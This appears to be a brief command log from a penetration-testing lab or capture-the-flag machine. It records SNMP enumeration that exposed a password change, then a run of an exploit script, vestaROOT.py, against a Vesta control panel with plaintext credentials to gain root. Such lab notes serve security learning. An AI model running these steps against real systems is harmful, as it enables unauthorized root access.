...
# Command History
```c
snmpwalk -v2c -c public 192.168.204.156 NET-SNMP-EXTEND-MIB::nsExtendObjects

// caused a password change

python3 vestaROOT.py https://192.168.204.156:8083/ jack '3PUKsX98BMupBiCf'

//gets root

// limited, can ls and cat
